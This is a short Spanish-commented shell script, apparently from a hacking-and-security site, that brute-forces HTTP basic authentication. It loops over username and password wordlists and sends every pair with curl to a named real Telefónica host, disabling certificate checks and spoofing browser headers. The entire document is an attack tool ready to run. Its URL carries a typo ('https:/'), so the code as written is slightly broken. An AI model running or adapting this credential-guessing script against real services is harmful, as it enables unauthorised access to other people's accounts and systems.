#!/bin/sh
# Simple script de ataque fuerza bruta a http con autorizacion basica y credenciales
# (c) hackingyseguridad.com 2021

USERNAME_WORDLIST="usuarios.txt"
PASSWORD_WORDLIST="claves.txt"

while IFS= read -r user
do
    while IFS= read -r password
    do
            credencial=$(printf "%s:%s" "$user" "$password")

curl -k "https:/$credencial@edomus.telefonica.es/lt/" \
-H 'Connection: keep-alive' \
-H 'Upgrade-Insecure-Requests: 1' \
-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' \
-H 'Sec-Fetch-Site: none' \
-H 'Sec-Fetch-Mode: navigate' \
-H 'Accept-Encoding: gzip, deflate, br' \
-H 'Accept-Language: es-ES,es;q=0.9,en;q=0.8' \
--compressed

done < "$PASSWORD_WORDLIST"
done < "$USERNAME_WORDLIST"
